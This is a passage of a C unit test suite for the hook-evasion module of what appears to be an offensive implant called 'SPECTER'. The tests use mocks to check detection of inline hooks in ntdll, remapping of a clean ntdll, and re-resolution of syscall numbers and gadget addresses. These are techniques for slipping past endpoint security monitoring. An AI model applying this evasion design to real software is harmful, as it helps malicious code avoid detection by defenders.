    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_refresh_ntdll(&ctx);
    ASSERT(!NT_SUCCESS(status), "fails when open section fails");
    ASSERT(ctx.clean_ntdll == NULL, "clean_ntdll cleared");

    printf("  Passed.\n");
}

static void test_refresh_ntdll_map_fail(void) {
    printf("[test_refresh_ntdll_map_fail]\n");
    reset_state();
    mock_map_view_fail = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_refresh_ntdll(&ctx);
    ASSERT(!NT_SUCCESS(status), "fails when map view fails");

    printf("  Passed.\n");
}

static void test_refresh_ntdll_gadget_fail(void) {
    printf("[test_refresh_ntdll_gadget_fail]\n");
    reset_state();
    mock_gadget_fail = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    NTSTATUS status = evasion_refresh_ntdll(&ctx);
    ASSERT(status == STATUS_PROCEDURE_NOT_FOUND,
           "fails when gadget not found");
    ASSERT(ctx.clean_ntdll == NULL, "clean_ntdll cleared on gadget failure");

    printf("  Passed.\n");
}

static void test_refresh_ntdll_ssns_updated(void) {
    printf("[test_refresh_ntdll_ssns_updated]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    evasion_refresh_ntdll(&ctx);

    /* SSNs should be re-resolved (mock returns hash & 0xFF) */
    for (int i = 0; i < FAKE_FUNC_COUNT; i++) {
        DWORD expected_ssn = test_func_hashes[i] & 0xFF;
        ASSERT(g_syscall_table.entries[i].ssn == expected_ssn,
               "SSN re-resolved correctly");
        ASSERT(g_syscall_table.entries[i].syscall_addr == mock_gadget_addr,
               "gadget addr updated");
    }

    printf("  Passed.\n");
}

static void test_refresh_ntdll_no_prior_mapping(void) {
    printf("[test_refresh_ntdll_no_prior_mapping]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = NULL;  /* No prior mapping */

    NTSTATUS status = evasion_refresh_ntdll(&ctx);
    ASSERT(NT_SUCCESS(status), "succeeds even without prior mapping");
    ASSERT(unmap_view_call_count == 0, "no unmap when no prior mapping");
    ASSERT(ctx.clean_ntdll == mock_refresh_ntdll_base, "new mapping set");

    printf("  Passed.\n");
}

/* ================================================================== */
/*  Integration Tests                                                  */
/* ================================================================== */

static void test_full_hook_detect_remediate_cycle(void) {
    printf("[test_full_hook_detect_remediate_cycle]\n");
    reset_state();

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    /* Step 1: Initialize CRC baselines */
    NTSTATUS status = evasion_init_crc_table(&ctx);
    ASSERT(NT_SUCCESS(status), "CRC init succeeds");

    /* Step 2: Verify no hooks initially */
    BOOL detected = evasion_check_hooks(&ctx);
    ASSERT(detected == FALSE, "no hooks initially");

    /* Step 3: Simulate hook installation */
    fake_live_funcs[2][0] = 0xFF;
    fake_live_funcs[2][1] = 0x25;  /* jmp [rip+disp32] */

    /* Step 4: Detect hooks */
    detected = evasion_check_hooks(&ctx);
    ASSERT(detected == TRUE, "hook detected after installation");

    /* Step 5: After remediation, clean_ntdll should be refreshed */
    ASSERT(ctx.clean_ntdll == mock_refresh_ntdll_base,
           "clean_ntdll refreshed after hook detection");

    printf("  Passed.\n");
}

static void test_crc_table_capacity_limit(void) {
    printf("[test_crc_table_capacity_limit]\n");
    reset_state();

    /* Fill syscall table to capacity */
    g_syscall_table.count = CRC_TABLE_CAPACITY + 10;
    for (DWORD i = 0; i < g_syscall_table.count && i < SYSCALL_TABLE_CAPACITY; i++) {
        g_syscall_table.entries[i].hash = test_func_hashes[i % FAKE_FUNC_COUNT];
        g_syscall_table.entries[i].ssn  = (DWORD)(0x10 + i);
    }

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.clean_ntdll = mock_clean_ntdll_base;

    evasion_init_crc_table(&ctx);
    ASSERT(ctx.crc_table.count <= CRC_TABLE_CAPACITY,
           "CRC table respects capacity limit");

    printf("  Passed.\n");
}

/* ================================================================== */
/*  Main                                                               */
/* ================================================================== */

int main(void) {
    printf("=== SPECTER Hook Evasion & Integrity Monitoring Test Suite ===\n\n");

    /* CRC32 computation tests */
    test_compute_crc_null();
    test_compute_crc_zero_len();
    test_compute_crc_deterministic();
    test_compute_crc_different_data();
    test_compute_crc_single_byte();
    test_compute_crc_known_value();
    test_compute_crc_sensitivity();

    /* CRC table initialization tests */
    test_init_crc_table_null_ctx();
    test_init_crc_table_no_clean_ntdll();
    test_init_crc_table_success();
    test_init_crc_table_empty_syscall_table();

    /* Hook detection tests */
    test_check_hooks_null_ctx();
    test_check_hooks_empty_crc_table();
    test_check_hooks_no_hooks();
    test_check_hooks_hook_detected();
    test_check_hooks_all_funcs_hooked();
    test_check_hooks_ntdll_not_found();
    test_check_hooks_recomputes_baselines();

    /* Refresh ntdll tests */
    test_refresh_ntdll_null_ctx();
    test_refresh_ntdll_success();
    test_refresh_ntdll_open_fail();
    test_refresh_ntdll_map_fail();
    test_refresh_ntdll_gadget_fail();
    test_refresh_ntdll_ssns_updated();
    test_refresh_ntdll_no_prior_mapping();

    /* Integration tests */
    test_full_hook_detect_remediate_cycle();
    test_crc_table_capacity_limit();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return (tests_passed == tests_run) ? 0 : 1;
}
